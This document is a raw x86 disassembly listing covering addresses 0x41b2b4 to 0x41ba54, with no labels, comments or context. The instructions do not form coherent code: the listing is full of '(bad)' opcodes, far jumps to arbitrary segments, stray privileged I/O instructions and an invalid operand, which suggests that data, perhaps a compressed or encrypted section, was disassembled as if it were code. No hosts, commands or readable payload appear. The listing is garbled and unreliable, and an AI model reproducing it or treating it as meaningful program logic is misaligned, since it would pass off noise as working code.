  41b2b4:	cmc    
  41b2b5:	pop    esi
  41b2b6:	aad    0xa3
  41b2b8:	mov    edx,0x469f6522
  41b2bd:	(bad)  
  41b2bf:	cs xchg ebx,eax
  41b2c1:	sti    
  41b2c2:	call   0xc6c6:0xbc2b1c9b
  41b2c9:	or     DWORD PTR [esi+0xb56b6c8],edx
  41b2cf:	ja     0x41b31e
  41b2d1:	mov    esi,0xd94b8665
  41b2d6:	jae    0x41b25c
  41b2d8:	sbb    dl,BYTE PTR [eax]
  41b2da:	call   0xea3a:0xbf7f1d41
  41b2e1:	fimul  DWORD PTR [esi-0x6605f7f7]
  41b2e7:	push   ss
  41b2e8:	arpl   WORD PTR [ebp-0x44],dx
  41b2eb:	jno    0x41b2b8
  41b2ed:	(bad)  [ecx-0x683ee6ea]
  41b2f3:	sub    eax,0xcf3bcbb7
  41b2f8:	push   ds
  41b2f9:	and    BYTE PTR [ebx+0x624c07ba],dh
  41b2ff:	das    
  41b300:	add    ch,BYTE PTR [edi+0x2b1d84a3]
  41b306:	(bad)  
  41b307:	shl    BYTE PTR [edx*1-0x6b06020],1
  41b30e:	add    al,0x4c
  41b310:	ret    0xe58d
  41b313:	out    0x77,eax
  41b315:	sbb    ebx,DWORD PTR [ebx-0x5ea1c411]
  41b31b:	pusha  
  41b31c:	lods   eax,DWORD PTR ds:[esi]
  41b31d:	mov    WORD PTR [esi-0x20],ss
  41b320:	and    DWORD PTR [eax-0x3c6463b8],eax
  41b326:	mov    cl,0x26
  41b328:	inc    edi
  41b32a:	xor    ebx,ecx
  41b32c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b32d:	mov    ebx,0x6eed5fae
  41b332:	test   al,0x1f
  41b334:	mov    bh,cl
  41b336:	out    dx,eax
  41b337:	call   0xb3ed3cde
  41b33c:	dec    edi
  41b33d:	aas    
  41b33e:	in     eax,0x76
  41b340:	xchg   esp,eax
  41b341:	mov    esp,0x6af013b8
  41b346:	mov    al,ds:0xc8335610
  41b34b:	test   al,0x98
  41b34d:	lds    ebp,FWORD PTR [ebp-0x4352854b]
  41b353:	(bad)  
  41b355:	lock (bad) 
  41b357:	mov    ebx,0xf8406a00
  41b35c:	jecxz  0x41b378
  41b35e:	dec    ebp
  41b35f:	nop
  41b360:	cmp    BYTE PTR [esi+eax*2+0x50],0x31
  41b365:	pop    esp
  41b366:	ins    BYTE PTR es:[edi],dx
  41b367:	fcomp  DWORD PTR [ebp+0x1b]
  41b36a:	fcom   QWORD PTR [ebx-0xd]
  41b36d:	aam    0xc7
  41b36f:	shl    BYTE PTR [ecx],0x6a
  41b372:	retf   0xa211
  41b375:	jecxz  0x41b3c8
  41b377:	js     0x41b335
  41b379:	(bad)  
  41b37a:	cli    
  41b37b:	mov    bh,0x5d
  41b37d:	add    eax,0xd5163443
  41b382:	repnz iret 
  41b384:	ds mov ecx,0xd8c52e4c
  41b38a:	dec    edx
  41b38b:	adc    eax,0xf6c96977
  41b390:	xor    al,0xcb
  41b392:	test   eax,0xc05252d8
  41b397:	lods   al,BYTE PTR ds:[esi]
  41b398:	shl    DWORD PTR [eax-0x63],0xda
  41b39c:	fcomp  DWORD PTR [esi+0x8ccbf88]
  41b3a2:	sti    
  41b3a3:	clc    
  41b3a4:	mov    cl,0xb8
  41b3a6:	inc    ebp
  41b3a7:	test   ebp,eax
  41b3a9:	(bad)  
  41b3aa:	fstp   TBYTE PTR [esi]
  41b3ac:	fsubr  DWORD PTR [ebx-0x39bb1c08]
  41b3b2:	xor    edx,eax
  41b3b4:	scas   al,BYTE PTR es:[edi]
  41b3b5:	ret    0x28e2
  41b3b8:	inc    ebp
  41b3b9:	rcr    DWORD PTR [edx+esi*2-0x3acea64e],1
  41b3c0:	fs (bad) 
  41b3c2:	fs jl  0x41b401
  41b3c5:	je     0x41b373
  41b3c7:	sbb    BYTE PTR [ebp-0x7b],dh
  41b3ca:	lods   al,BYTE PTR ds:[esi]
  41b3cb:	push   esp
  41b3cc:	popa   
  41b3cd:	jmp    0x2acf2f56
  41b3d2:	data16 jp 0x41b3b3
  41b3d5:	xchg   edi,eax
  41b3d6:	jp     0x41b38e
  41b3d8:	jae    0x41b36e
  41b3da:	xchg   edi,eax
  41b3db:	inc    ebx
  41b3dc:	and    al,0x4e
  41b3de:	push   ds
  41b3df:	cmp    DWORD PTR [esi],ecx
  41b3e1:	sub    cl,BYTE PTR [edi+0x25]
  41b3e4:	in     eax,0x9e
  41b3e6:	push   0xc51ebeb4
  41b3eb:	mov    dh,0xef
  41b3ed:	and    ebp,edi
  41b3ef:	push   ds
  41b3f0:	inc    eax
  41b3f1:	jmp    0x41b37d
  41b3f3:	cs clc 
  41b3f5:	xor    ah,BYTE PTR [ecx-0x15]
  41b3f8:	mov    eax,ds:0x82202111
  41b3fd:	add    bl,ah
  41b3ff:	(bad)  
  41b400:	mov    eax,0xd260bf4a
  41b405:	imul   esi,DWORD PTR [eax+ebx*4-0x45],0xffffff98
  41b40a:	adc    DWORD PTR [esi*2-0x2c21f9c0],ebp
  41b411:	sub    esi,DWORD PTR [eax-0x7f]
  41b414:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b415:	sub    esi,ebp
  41b417:	rep lods eax,DWORD PTR ds:[esi]
  41b419:	pop    esi
  41b41a:	dec    edx
  41b41b:	repnz jecxz 0x41b451
  41b41e:	jo     0x41b3d0
  41b420:	sahf   
  41b421:	dec    edx
  41b422:	push   ecx
  41b423:	jnp    0x41b3e7
  41b425:	mov    edi,es
  41b427:	mov    ah,0x7c
  41b429:	bt     eax,ebx
  41b42c:	xor    BYTE PTR [ebx],bl
  41b42e:	rcl    ebp,cl
  41b430:	ins    DWORD PTR es:[edi],dx
  41b431:	inc    edx
  41b432:	repz sbb al,0x90
  41b435:	or     BYTE PTR [ecx],ch
  41b437:	sub    al,0x15
  41b439:	inc    ebp
  41b43a:	push   ss
  41b43b:	clc    
  41b43c:	(bad)  
  41b43d:	dec    ecx
  41b43e:	or     eax,0x4cdeb5d6
  41b443:	add    BYTE PTR [edi+edx*8-0x7e],bh
  41b447:	or     edx,DWORD PTR [eax+ebp*4+0x19]
  41b44b:	(bad)  [ecx+0x58]
  41b44e:	fisubr WORD PTR [ebx]
  41b450:	loop   0x41b42f
  41b452:	cmp    BYTE PTR [eax+0x4a],dh
  41b455:	pop    es
  41b456:	std    
  41b457:	lds    esi,FWORD PTR [ebp+eax*2-0xd18b509]
  41b45e:	call   0x97db289b
  41b463:	jns    0x41b40c
  41b465:	fwait
  41b466:	in     eax,dx
  41b467:	rcr    BYTE PTR gs:[eax],0xf9
  41b46b:	lods   eax,DWORD PTR ds:[esi]
  41b46c:	mov    edx,0x54b60f09
  41b471:	dec    esp
  41b472:	or     esi,0xa53b8414
  41b478:	mov    edx,0x929a773c
  41b47d:	pop    edx
  41b47e:	cmp    BYTE PTR [eax+0x4ab8a10e],0x1a
  41b485:	mov    ah,ah
  41b487:	repz xor BYTE PTR ds:0x7854335a,ch
  41b48e:	mov    ah,0x32
  41b490:	adc    eax,0x1ec6e679
  41b495:	push   ebp
  41b496:	loopne 0x41b42b
  41b498:	cmp    DWORD PTR [ecx+eax*2-0x1f69c24d],esi
  41b49f:	mov    bl,BYTE PTR [esi-0x33]
  41b4a2:	mov    edi,0x96ab2438
  41b4a7:	test   BYTE PTR [edi+0x40873843],al
  41b4ad:	pop    ecx
  41b4ae:	sbb    eax,0xa9c76c2
  41b4b3:	popf   
  41b4b4:	inc    edi
  41b4b5:	inc    eax
  41b4b6:	out    0x7c,eax
  41b4b8:	add    al,0x0
  41b4ba:	cmp    eax,0xb68025e7
  41b4bf:	and    DWORD PTR [ebp+0x3089a6f5],eax
  41b4c5:	fwait
  41b4c6:	jb     0x41b506
  41b4c8:	lahf   
  41b4c9:	sbb    bh,BYTE PTR [esi]
  41b4cb:	pop    ebx
  41b4cc:	mov    ds:0x34ec2e7a,eax
  41b4d1:	shl    BYTE PTR [ebx+0x5c386073],cl
  41b4d7:	xchg   edi,eax
  41b4d8:	and    al,BYTE PTR [ebp+0x66]
  41b4db:	or     cl,BYTE PTR [edi+0x5014c784]
  41b4e1:	pop    eax
  41b4e2:	dec    ecx
  41b4e3:	mov    ds:0x5779f954,al
  41b4e8:	mov    ah,0x5e
  41b4ea:	leave  
  41b4eb:	mov    eax,DWORD PTR [esp+eax*8]
  41b4ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b4ef:	and    eax,0x2d08bb53
  41b4f4:	and    esi,DWORD PTR [edi+0x68]
  41b4f7:	sub    eax,0xb37a656f
  41b4fc:	in     al,0xd5
  41b4fe:	sbb    ah,dh
  41b500:	mov    eax,ds:0x73867143
  41b505:	ds test eax,0x3b56e9d
  41b50b:	ja     0x41b513
  41b50d:	sub    eax,0xd13d1c85
  41b512:	jl     0x41b4f5
  41b514:	pushf  
  41b515:	cmp    DWORD PTR [esi+0x7f],ecx
  41b518:	cmp    eax,0xf3b6631b
  41b51d:	loopne 0x41b4b4
  41b51f:	ins    BYTE PTR es:[edi],dx
  41b520:	mov    DWORD PTR [edi+ebp*2-0x5d],esi
  41b524:	mov    ah,0x5b
  41b526:	cmp    al,BYTE PTR [eax-0xdf68663]
  41b52c:	mov    dh,BYTE PTR [ebp-0x3f]
  41b52f:	dec    esi
  41b530:	mov    edx,0xe4433a91
  41b535:	scas   eax,DWORD PTR es:[edi]
  41b536:	sahf   
  41b537:	adc    DWORD PTR ds:0x8a24e2a7,0xffffffd1
  41b53e:	cs mov dl,0x8f
  41b541:	outs   dx,DWORD PTR ds:[esi]
  41b542:	sbb    bh,BYTE PTR [edx-0x6e806cbd]
  41b548:	add    al,0x43
  41b54a:	cld    
  41b54b:	leave  
  41b54c:	cmc    
  41b54d:	mov    WORD PTR [edi+0x64],gs
  41b550:	sbb    BYTE PTR [eax],bl
  41b552:	(bad)  
  41b553:	adc    al,0xd4
  41b555:	ins    DWORD PTR es:[edi],dx
  41b556:	jne    0x41b5d7
  41b558:	fs push ebx
  41b55a:	add    DWORD PTR [ecx],esi
  41b55c:	dec    edi
  41b55d:	sbb    DWORD PTR [edi+0x77b6216d],0xffffffe5
  41b564:	cs xchg esi,eax
  41b566:	jb     0x41b56c
  41b568:	xchg   esi,eax
  41b569:	add    BYTE PTR [eax+0x24],0x6a
  41b56d:	pop    ecx
  41b56e:	push   esi
  41b56f:	sbb    al,0xbc
  41b571:	push   edi
  41b572:	mov    DWORD PTR [edi+ecx*8+0x2d],eax
  41b576:	pop    ecx
  41b577:	adc    eax,0x2e767120
  41b57c:	addr16 lahf 
  41b57e:	push   0x2d
  41b580:	mov    dh,0x14
  41b582:	rcr    DWORD PTR [edi-0x524d27c],cl
  41b588:	jb     0x41b50c
  41b58a:	cwde   
  41b58b:	in     al,0x53
  41b58d:	pop    ebx
  41b58e:	xor    ah,ah
  41b590:	nop
  41b591:	hlt    
  41b592:	pop    edx
  41b593:	pop    ss
  41b594:	mov    ch,0x5f
  41b596:	fsubr  st,st(5)
  41b598:	(bad)  
  41b599:	or     BYTE PTR ds:0x26202853,dl
  41b59f:	sub    BYTE PTR [esi-0x79ced519],dh
  41b5a5:	inc    edx
  41b5a6:	fst    QWORD PTR [esi+edi*4]
  41b5a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5aa:	into   
  41b5ab:	int    0xa6
  41b5ad:	(bad)  
  41b5ae:	jne    0x41b5d9
  41b5b0:	iret   
  41b5b1:	mov    esp,0xe58d6035
  41b5b6:	dec    esp
  41b5b7:	imul   ebx,DWORD PTR [ebx+0x2a],0xe376a496
  41b5be:	and    esi,DWORD PTR [edi-0x72cc77df]
  41b5c4:	xchg   esp,esp
  41b5c6:	or     ecx,esi
  41b5c8:	pop    edi
  41b5c9:	and    eax,DWORD PTR ss:[edi+0x536b50a1]
  41b5d0:	dec    esp
  41b5d1:	in     eax,0x22
  41b5d3:	mov    bl,0x23
  41b5d5:	ds jnp 0x41b614
  41b5d8:	scas   eax,DWORD PTR es:[edi]
  41b5d9:	cwde   
  41b5da:	test   al,0x85
  41b5dd:	pusha  
  41b5de:	ror    ch,1
  41b5e0:	mov    cl,cl
  41b5e2:	pop    ds
  41b5e3:	push   edi
  41b5e4:	dec    ecx
  41b5e5:	sbb    al,0x38
  41b5e7:	jmp    0x41b5f6
  41b5e9:	xchg   DWORD PTR [edi+esi*1+0x37],ebp
  41b5ed:	test   BYTE PTR [edi+edi*2+0x6f],ah
  41b5f1:	jns    0x41b662
  41b5f3:	(bad)  
  41b5f4:	rol    DWORD PTR [esi-0x2ff1f69b],cl
  41b5fa:	cmp    edx,DWORD PTR [edi+eiz*8+0x46]
  41b5fe:	pop    eax
  41b5ff:	add    eax,0xe5fd969f
  41b604:	int    0xc6
  41b606:	or     BYTE PTR [ebp+0x685bfb19],ch
  41b60c:	add    BYTE PTR [edx+0x19],ah
  41b60f:	loope  0x41b5d6
  41b611:	inc    eax
  41b612:	sbb    DWORD PTR [eax],0x7075462
  41b618:	jmp    0x88d2e9db
  41b61d:	jmp    0xd685:0xdaffd8e2
  41b624:	clc    
  41b625:	adc    DWORD PTR [esi-0x2e],edx
  41b628:	lahf   
  41b629:	push   ebx
  41b62a:	adc    cl,BYTE PTR [edi+0x2853f9df]
  41b630:	nop
  41b631:	pop    es
  41b632:	dec    esp
  41b633:	sahf   
  41b634:	cmp    eax,0xd6b53d57
  41b639:	sub    cl,al
  41b63b:	xchg   DWORD PTR [ecx],edi
  41b63d:	les    ecx,FWORD PTR [ebx]
  41b63f:	cwde   
  41b640:	fs jns 0x41b665
  41b643:	add    al,0x99
  41b645:	mov    WORD PTR [edx-0x61e3aee5],ds
  41b64b:	pusha  
  41b64c:	sti    
  41b64d:	push   cs
  41b64e:	rcr    BYTE PTR [esi],cl
  41b650:	(bad)  
  41b651:	scas   al,BYTE PTR es:[edi]
  41b652:	and    esp,ebx
  41b654:	xchg   dl,ah
  41b656:	inc    edi
  41b657:	stc    
  41b658:	or     edi,DWORD PTR [esi+eax*8-0x58]
  41b65c:	xchg   esi,eax
  41b65d:	push   edi
  41b65e:	or     ebx,DWORD PTR ds:[eiz*4+0x3189bf95]
  41b666:	xor    eax,0x57918872
  41b66b:	pop    ecx
  41b66c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b66d:	(bad)  
  41b66e:	shr    ebx,1
  41b670:	pop    es
  41b671:	inc    ebp
  41b672:	cdq    
  41b673:	jmp    0x740c:0x706eb198
  41b67a:	stos   DWORD PTR es:[edi],eax
  41b67b:	(bad)  [edi]
  41b67d:	add    DWORD PTR [eax-0xe0f1f60],0xffffffc9
  41b684:	imul   esp,eax,0xffffff8a
  41b687:	pop    esi
  41b688:	mov    bl,0x27
  41b68a:	pop    ss
  41b68b:	ffreep st(2)
  41b68d:	or     BYTE PTR [edi],0xb4
  41b690:	in     eax,0xf9
  41b692:	repnz or eax,0x525137ac
  41b698:	test   DWORD PTR [edi-0x72eac1fe],0xdf42b82e
  41b6a2:	out    dx,al
  41b6a3:	mov    al,0xb9
  41b6a5:	ja     0x41b716
  41b6a7:	xchg   ecx,eax
  41b6a8:	iret   
  41b6a9:	jns    0x41b641
  41b6ab:	sahf   
  41b6ac:	add    BYTE PTR [esi+0x78],dl
  41b6af:	mov    ah,0xf0
  41b6b1:	mov    eax,ds:0xbac0f987
  41b6b7:	lods   al,BYTE PTR ds:[esi]
  41b6b8:	and    DWORD PTR [edx],0xffffffdc
  41b6bb:	inc    ebx
  41b6bc:	adc    DWORD PTR ds:0xc30ba704,eax
  41b6c2:	jp     0x41b6ec
  41b6c4:	sbb    dl,0x23
  41b6c7:	cwde   
  41b6c8:	cmp    eax,0x7cbc0f78
  41b6cd:	jno    0x41b6b2
  41b6cf:	lock idiv BYTE PTR [esi+0x623152e7]
  41b6d6:	popa   
  41b6d7:	sub    BYTE PTR [eax],dh
  41b6d9:	or     DWORD PTR [ecx],0x3e
  41b6dc:	push   cs
  41b6dd:	mov    dh,0x19
  41b6df:	(bad)  
  41b6e0:	cld    
  41b6e1:	ret    0x2883
  41b6e4:	cmc    
  41b6e5:	sbb    BYTE PTR [ebx-0xd],bl
  41b6e8:	push   eax
  41b6e9:	inc    ebx
  41b6ea:	sbb    ecx,ecx
  41b6ec:	sub    al,0x55
  41b6ee:	fdiv   DWORD PTR [edi]
  41b6f0:	cmc    
  41b6f1:	adc    bh,bh
  41b6f3:	cmp    ch,BYTE PTR [ebp+0x69]
  41b6f6:	int3   
  41b6f7:	inc    edx
  41b6f8:	dec    ebp
  41b6f9:	fs cs jge 0x41b6e5
  41b6fd:	cdq    
  41b6fe:	hlt    
  41b6ff:	xor    eax,0xd688299e
  41b704:	les    eax,FWORD PTR [edx-0xd]
  41b707:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b708:	xor    al,0x10
  41b70a:	mov    bl,0xac
  41b70c:	pop    eax
  41b70d:	fisubr DWORD PTR [edi+0x66]
  41b710:	sbb    esp,edi
  41b712:	mov    ebp,0xe07f7dd1
  41b717:	mov    ds,WORD PTR [ecx-0x63dc0ab7]
  41b71d:	xor    ecx,DWORD PTR [ebp-0x17f78ded]
  41b723:	in     al,0xac
  41b725:	cmp    al,0xe8
  41b727:	mov    dh,0xe4
  41b729:	push   esi
  41b72a:	mov    edx,0x147d7659
  41b72f:	rcl    DWORD PTR [edi],cl
  41b731:	jnp    0x41b7a9
  41b733:	fnstsw WORD PTR [edx+edx*1+0x176a30f6]
  41b73a:	ss xchg ecx,eax
  41b73c:	mov    dl,0xba
  41b73e:	or     BYTE PTR [edi-0x69],0xf0
  41b742:	outs   dx,BYTE PTR ds:[esi]
  41b743:	pop    edi
  41b744:	in     al,0x6d
  41b746:	(bad)  
  41b747:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b748:	adc    bl,bh
  41b74a:	les    esi,FWORD PTR [ecx]
  41b74c:	push   ecx
  41b74d:	jmp    0x41b7b7
  41b74f:	jmp    0xcbd767fc
  41b754:	or     DWORD PTR [esi],edx
  41b756:	push   edi
  41b757:	jno    0x41b7a8
  41b759:	sti    
  41b75a:	lea    ebx,[edx]
  41b75c:	dec    ebp
  41b75d:	fs or  eax,0x6d7ae2de
  41b763:	call   0x900b:0x1c7a77cd
  41b76a:	(bad)  ds:0xc6478d25
  41b770:	ins    DWORD PTR es:[edi],dx
  41b771:	and    DWORD PTR [ebp-0x78453d59],esi
  41b777:	test   eax,0xf5442176
  41b77c:	clc    
  41b77d:	shl    ecx,0xce
  41b780:	push   0xffffffc5
  41b782:	pop    ebp
  41b783:	test   al,0x2b
  41b785:	cmp    edi,DWORD PTR [eax+0x21f4a6ea]
  41b78b:	jg     0x41b7b9
  41b78d:	neg    DWORD PTR [edx]
  41b78f:	lock xchg ecx,eax
  41b791:	add    eax,0xe0109ba8
  41b796:	fimul  DWORD PTR [ecx]
  41b798:	xchg   ecx,eax
  41b799:	fwait
  41b79a:	ss ss push ecx
  41b79d:	repnz sub bh,BYTE PTR [eax]
  41b7a0:	retf   0xc2d4
  41b7a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7a4:	ficomp DWORD PTR [ebp+ebx*4+0x5492a57a]
  41b7ab:	shl    BYTE PTR [esi-0x3a],0xdf
  41b7af:	test   cl,ah
  41b7b1:	add    eax,0xfdff7093
  41b7b6:	jno    0x41b7e2
  41b7b8:	fwait
  41b7b9:	xor    dl,bh
  41b7bb:	popa   
  41b7bc:	push   esp
  41b7bd:	test   DWORD PTR [esi+eiz*1+0x2e],ebx
  41b7c1:	xchg   ebx,eax
  41b7c2:	lods   al,BYTE PTR ds:[esi]
  41b7c3:	mov    DWORD PTR [eax+0x8],ebp
  41b7c6:	jge    0x41b768
  41b7c8:	js     0x41b839
  41b7ca:	inc    ebx
  41b7cb:	xchg   ecx,eax
  41b7cc:	jp     0x41b81a
  41b7ce:	outs   dx,BYTE PTR ds:[esi]
  41b7cf:	jo     0x41b79c
  41b7d1:	sbb    eax,0xd2baa267
  41b7d6:	xor    eax,0x4123cbb5
  41b7db:	adc    eax,0x1270c622
  41b7e0:	test   DWORD PTR [esi-0x68],edi
  41b7e3:	or     eax,0x2ca90f5a
  41b7e8:	int3   
  41b7e9:	adc    esp,DWORD PTR [esi-0x70]
  41b7ec:	push   es
  41b7ed:	stos   DWORD PTR es:[edi],eax
  41b7ee:	retf   
  41b7ef:	int    0x79
  41b7f1:	dec    eax
  41b7f2:	ror    BYTE PTR [esi],1
  41b7f4:	or     al,0x67
  41b7f6:	pop    ebx
  41b7f7:	pop    ebp
  41b7f8:	call   0xe94c:0xeafdf557
  41b7ff:	push   0xffffff8d
  41b801:	push   esp
  41b802:	xchg   ecx,eax
  41b803:	loop   0x41b7f3
  41b805:	scas   eax,DWORD PTR es:[edi]
  41b806:	in     eax,dx
  41b807:	pop    ds
  41b808:	push   esi
  41b809:	sub    BYTE PTR [eax+0x204a2d85],bh
  41b80f:	sbb    BYTE PTR [ecx+ebp*8+0x1c],ch
  41b813:	stos   BYTE PTR es:[edi],al
  41b814:	gs jno 0x41b87e
  41b817:	sbb    DWORD PTR [ebx+0x7d],ebx
  41b81a:	mov    dh,0xb1
  41b81c:	aas    
  41b81d:	push   ecx
  41b81e:	aas    
  41b81f:	jb     0x41b7bf
  41b821:	xchg   esi,eax
  41b822:	pusha  
  41b823:	ds pop ecx
  41b825:	and    eax,0x35b1c323
  41b82a:	loop   0x41b80c
  41b82c:	es nop
  41b82e:	mov    eax,ds:0x92c61e3c
  41b833:	div    DWORD PTR [ecx+0x31]
  41b836:	out    dx,eax
  41b837:	pop    ebx
  41b838:	inc    ecx
  41b839:	je     0x41b7e2
  41b83b:	jae    0x41b86a
  41b83d:	cmp    eax,0x6ef9f9bb
  41b842:	loop   0x41b7c8
  41b844:	mov    WORD PTR [ecx-0x4],gs
  41b847:	mov    al,ds:0x8cb511cb
  41b84c:	mov    esp,0xc6704f65
  41b851:	push   ecx
  41b852:	cmp    dh,dl
  41b854:	xor    bh,BYTE PTR [ecx+0x4aaf206f]
  41b85a:	ins    BYTE PTR es:[edi],dx
  41b85b:	mov    eax,ds:0x4f1d8461
  41b860:	xor    DWORD PTR [esi],0xcdf83dbf
  41b866:	pushf  
  41b867:	or     DWORD PTR [esi],esi
  41b869:	call   0x202e:0xd057861d
  41b870:	popa   
  41b871:	add    al,0x98
  41b873:	and    DWORD PTR [esi-0x5c73c874],0x63
  41b87a:	mov    ds:0x43c90b53,eax
  41b87f:	adc    ebp,DWORD PTR [ecx]
  41b881:	push   cs
  41b882:	leave  
  41b883:	xchg   ecx,eax
  41b884:	mov    ds:0xa65944b9,eax
  41b889:	and    DWORD PTR ds:0x970c3d7a,edi
  41b88f:	pushf  
  41b890:	or     esp,DWORD PTR ds:0xd909a988
  41b896:	mov    al,ds:0x83ea9a73
  41b89b:	pusha  
  41b89c:	les    ecx,FWORD PTR [edi+0x70]
  41b89f:	shl    DWORD PTR [ecx-0x70accc54],0x71
  41b8a6:	pop    esi
  41b8a7:	mov    ?,esp
  41b8a9:	lea    ebp,[ebx+0x7c2b3d42]
  41b8af:	push   eax
  41b8b0:	push   ss
  41b8b1:	ror    DWORD PTR [edx+edi*4+0x30e15640],1
  41b8b8:	test   al,0x0
  41b8ba:	xor    dl,BYTE PTR [esi+0x196b4cac]
  41b8c0:	push   ebx
  41b8c1:	xchg   esp,eax
  41b8c2:	sub    eax,0x60a6e921
  41b8c7:	sbb    eax,0xc107705a
  41b8cc:	lock adc eax,DWORD PTR [eax-0x1f]
  41b8d0:	shl    BYTE PTR [ebx],cl
  41b8d2:	pop    ds
  41b8d3:	adc    ecx,DWORD PTR [ebp+0x7]
  41b8d6:	jl     0x41b931
  41b8d8:	mov    BYTE PTR [ebp+ebx*2+0x10],0xc6
  41b8dd:	push   ss
  41b8de:	xchg   edi,eax
  41b8df:	jnp    0x41b8a0
  41b8e1:	mov    ds:0xf5b75d98,al
  41b8e6:	push   ecx
  41b8e7:	pop    es
  41b8e8:	(bad)  
  41b8e9:	dec    edi
  41b8ea:	and    BYTE PTR [edi-0x3ffc84d7],cl
  41b8f0:	xor    DWORD PTR [esi-0x61],esp
  41b8f3:	push   eax
  41b8f4:	push   0xffffffc0
  41b8f6:	mov    eax,ds:0x11c6d4a3
  41b8fb:	fist   DWORD PTR [ecx]
  41b8fd:	sahf   
  41b8fe:	je     0x41b951
  41b900:	mov    DWORD PTR [ebx],ebp
  41b902:	jl     0x41b907
  41b904:	jge    0x41b905
  41b906:	rol    edx,0xf6
  41b909:	dec    edx
  41b90a:	xor    eax,0xf8d7adee
  41b90f:	stos   BYTE PTR es:[edi],al
  41b910:	arpl   WORD PTR [ecx],ax
  41b912:	sbb    eax,DWORD PTR [edx+ebp*8+0x20bda345]
  41b919:	jge    0x41b8d2
  41b91b:	sbb    eax,0xe7be90b
  41b920:	and    eax,DWORD PTR ds:0x92c22430
  41b926:	fxch   st(3)
  41b928:	rol    BYTE PTR [edx+0x32],cl
  41b92b:	stc    
  41b92c:	mov    esp,0xeee46ea2
  41b931:	add    ecx,eax
  41b933:	es aad 0xd5
  41b936:	dec    ecx
  41b937:	in     al,dx
  41b938:	call   0x4df7634e
  41b93d:	jl     0x41b9a9
  41b93f:	push   es
  41b940:	dec    ebp
  41b941:	inc    edi
  41b942:	adc    BYTE PTR [ecx+0x2f],0x64
  41b946:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b947:	repnz lock pop ds
  41b94a:	ret    
  41b94b:	sub    al,0x87
  41b94d:	inc    ebx
  41b94e:	mov    dl,BYTE PTR [ebx+0x616f7d8b]
  41b954:	jo     0x41b920
  41b956:	push   eax
  41b957:	push   eax
  41b958:	dec    ebp
  41b959:	clc    
  41b95a:	mov    BYTE PTR [edx+0x7aeeefcf],ch
  41b960:	clc    
  41b961:	push   ds
  41b962:	xor    al,0x47
  41b964:	mov    al,ds:0xbfffa7af
  41b969:	es pop ebx
  41b96b:	sbb    edi,DWORD PTR [eax-0x3f2a2ec1]
  41b971:	jge    0x41b9d4
  41b973:	jmp    0x78cb:0xcfe43446
  41b97a:	cmp    eax,0xaeb592ca
  41b97f:	ss jmp 0xe9e:0x149b546a
  41b987:	or     eax,0x9ac116be
  41b98c:	jb     0x41b9e7
  41b98e:	xor    eax,0x6bafdb59
  41b993:	out    dx,al
  41b994:	cli    
  41b995:	xchg   ecx,eax
  41b996:	xchg   ebp,eax
  41b997:	xor    al,0x7a
  41b999:	call   0x4ff3be1f
  41b99e:	jbe    0x41b95b
  41b9a0:	cmc    
  41b9a1:	sar    DWORD PTR [eax+0x6b],cl
  41b9a4:	lahf   
  41b9a5:	mov    ds:0xb228b615,eax
  41b9aa:	shl    BYTE PTR [ebp-0x23],cl
  41b9ad:	inc    esi
  41b9ae:	ds push ebx
  41b9b0:	(bad)  
  41b9b1:	fadd   DWORD PTR [ebx-0x11]
  41b9b4:	ins    BYTE PTR es:[edi],dx
  41b9b5:	mov    al,ds:0x8604f6b3
  41b9ba:	mov    eax,0x204a1c74
  41b9bf:	push   esi
  41b9c0:	ret    
  41b9c1:	pop    ebp
  41b9c2:	pop    ss
  41b9c3:	xor    BYTE PTR [ebx-0x51],bl
  41b9c6:	push   ebp
  41b9c7:	sar    dh,1
  41b9c9:	jae    0x41b9eb
  41b9cb:	cmp    edi,DWORD PTR [eax+0x670005eb]
  41b9d1:	ret    0xae28
  41b9d4:	pop    ds
  41b9d5:	out    0xe2,al
  41b9d7:	mul    BYTE PTR [edi-0x63d617fe]
  41b9dd:	sbb    BYTE PTR [esi],ah
  41b9df:	popa   
  41b9e0:	cmc    
  41b9e1:	jge    0x41b9b2
  41b9e3:	cld    
  41b9e4:	jmp    0xb9c34921
  41b9e9:	pop    esp
  41b9ea:	dec    esp
  41b9eb:	fs int 0x83
  41b9ee:	sbb    DWORD PTR [edx-0x5e7951f2],edi
  41b9f4:	les    edx,FWORD PTR [ebx+ebx*1-0x5f82207f]
  41b9fb:	mov    edi,0x42b30905
  41ba00:	pop    ss
  41ba01:	inc    ebx
  41ba02:	pop    ecx
  41ba03:	push   ds
  41ba04:	xchg   edi,eax
  41ba05:	xchg   esp,eax
  41ba06:	and    al,0x77
  41ba08:	xchg   DWORD PTR [ecx+eax*4-0x19571c78],esi
  41ba0f:	add    al,BYTE PTR [ecx+0x2c]
  41ba12:	js     0x41ba2f
  41ba14:	enter  0xcd62,0xd6
  41ba18:	push   esp
  41ba19:	ficom  DWORD PTR [eax+0x6d]
  41ba1c:	inc    eax
  41ba1d:	aas    
  41ba1e:	jns    0x41ba04
  41ba20:	sbb    eax,0x1fc0342d
  41ba25:	jp     0x41baa4
  41ba27:	bnd jae 0x41ba10
  41ba2a:	sti    
  41ba2b:	loopne 0x41ba8b
  41ba2d:	mov    ecx,0x442ef875
  41ba32:	pop    ds
  41ba33:	xor    eax,0x76d3a4c3
  41ba38:	cwde   
  41ba39:	fsub   st,st(6)
  41ba3b:	push   ebx
  41ba3c:	mov    ch,0xf4
  41ba3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba40:	cmp    DWORD PTR [ecx-0x3746b39c],edi
  41ba46:	std    
  41ba47:	shl    BYTE PTR [esi],1
  41ba49:	pop    ds
  41ba4a:	in     al,dx
  41ba4b:	push   cs
  41ba4c:	add    ebx,esi
  41ba4e:	ins    DWORD PTR es:[edi],dx
  41ba4f:	stos   DWORD PTR es:[edi],eax
  41ba50:	cmp    dh,ch
  41ba52:	lods   eax,DWORD PTR ds:[esi]
  41ba53:	pop    es
  41ba54:	cs daa 
